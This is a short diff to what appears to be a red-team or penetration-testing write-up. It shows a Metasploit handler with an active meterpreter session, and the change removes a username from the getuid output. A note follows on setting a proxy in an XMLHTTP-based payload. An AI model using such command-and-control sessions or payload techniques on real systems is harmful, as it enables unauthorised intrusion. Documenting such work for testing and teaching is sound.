@@ -125,7 +125,7 @@ msf6 exploit(multi/handler) > run
 meterpreter > whoami
 [-] Unknown command: whoami. Run the help command for more details.
 meterpreter > getuid
-Server username: COMMANDO\dooley
+Server username: 
 ```
 
 - If we needed to set a proxy `oSrvXMLHTTPRequest.setProxy(proxySetting, varProxyServer, varBypassList);`
